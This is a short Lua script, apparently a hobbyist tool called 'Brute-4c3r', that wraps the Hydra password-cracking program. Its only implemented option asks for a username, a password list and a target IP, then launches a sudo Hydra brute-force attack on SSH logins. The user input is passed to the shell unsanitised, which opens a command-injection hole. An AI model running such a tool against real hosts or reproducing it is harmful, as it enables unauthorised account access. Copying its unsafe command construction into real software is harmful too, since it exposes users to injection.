-- Creating a banner

function banner()
    io.write("\n")
    os.execute("figlet -f slant Brute-4c3r")
    print("[[- Brute-forcer v-1.0 -]]")
    print("[[* github.com/Britania-maker -]]")
    print("[[* github.com/Salvatore-droid -]]")
    print("[[- Created by Brightone and Genius -]]\n")

end

function hash()
    io.write(string.rep("#", 80))
end

-- hydra brute force list

function hydra_list()
    print("\n")
    print([[[1] Hydra to brute ftp
[2] Hydra to brute http
[3] Hydra to brute ssh
    ]])
    io.write("Enter value of choice to use: ")
    local value = io.read()
    if value == "1" then
        print("ftd under development.")
    elseif value == "2" then
        print("http under development")
    elseif value == "3" then
        hydra_ssh()
    else
        print("Invalid choice, enter either 1, 2 or 3.")
    end 
end


-- hydra brute force tool for ssh

function hydra_ssh()
    io.write("\nEnter username: ")
    local username = io.read()
    io.write("Enter password list: ")
    local password_list = io.read()
    io.write("Enter target IP: ")
    local IP_Adress = io.read()
    os.execute("sudo hydra -l "..username.." -P "..password_list.." "..IP_Adress.." -t 4 ssh")
end

function main()
    hash()
    banner()
    hash()
    hydra_list()
end

main()